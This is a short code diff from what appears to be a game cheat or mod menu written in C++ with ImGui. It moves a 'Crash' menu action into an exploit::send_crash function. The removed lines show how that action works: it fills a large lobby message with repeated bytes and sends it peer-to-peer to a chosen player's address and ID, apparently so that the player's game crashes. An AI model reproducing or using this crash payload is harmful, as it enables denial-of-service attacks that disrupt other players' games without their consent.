@@ -270,17 +270,7 @@ namespace menu
 						{
 							if (ImGui::MenuItem("Crash", nullptr, nullptr, is_netadr_valid))
 							{
-								char buf[0x10000] = { 0 };
-								game::msg_t msg{};
-
-								msg.init_lobby(buf, game::MESSAGE_TYPE_LOBBY_STATE_PRIVATE);
-
-								while (msg.cursize < msg.maxsize)
-								{
-									msg.write<uint8_t>(0x10);
-								}
-
-								events::lobby_msg::send_lobby_msg(game::LOBBY_MODULE_PEER_TO_PEER, msg, netadr, player_xuid);
+								exploit::send_crash(netadr, player_xuid);
 							}
 							
 							if (ImGui::MenuItem("Show migration screen", nullptr, nullptr, is_netadr_valid))
